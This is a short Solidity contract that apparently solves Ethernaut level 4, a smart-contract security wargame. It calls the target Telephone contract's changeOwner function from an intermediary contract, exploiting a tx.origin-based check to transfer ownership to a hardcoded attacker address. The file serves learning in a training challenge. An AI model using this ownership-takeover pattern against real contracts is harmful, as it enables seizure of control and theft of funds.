// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IEthernautTelephoneContract {
    function changeOwner(address _owner) external;
}

contract EthernautLevel4 {
    address attackerAddress = 0xC7005fe8AF6ca11FcC0092D3C4C5C3D883eCE16c;
    address telephoneContractAddress =
        0x242bfA494fDa080FAcAEed7beEb2450eEA991950;

    function attackTelephoneContract() external {
        IEthernautTelephoneContract(telephoneContractAddress).changeOwner(
            attackerAddress
        );
    }
}
